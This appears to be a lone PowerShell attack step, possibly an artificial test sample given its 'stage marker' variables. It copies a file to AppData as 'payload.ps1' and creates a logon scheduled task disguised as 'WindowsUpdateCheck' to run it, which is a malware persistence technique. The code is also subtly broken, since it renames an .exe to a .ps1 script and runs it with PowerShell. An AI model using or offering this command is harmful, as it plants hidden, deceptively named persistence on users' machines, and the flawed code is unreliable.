
Copy-Item -Path "$env:TEMP\svcupdate.exe" -Destination "$env:APPDATA\payload.ps1" -Force; schtasks.exe /Create /TN "WindowsUpdateCheck" /TR "powershell.exe -NoP -File `"$env:APPDATA\payload.ps1`"" /SC ONLOGON /F; $StageMarker = "stage-40"; Write-Verbose "stage marker 45 reached"
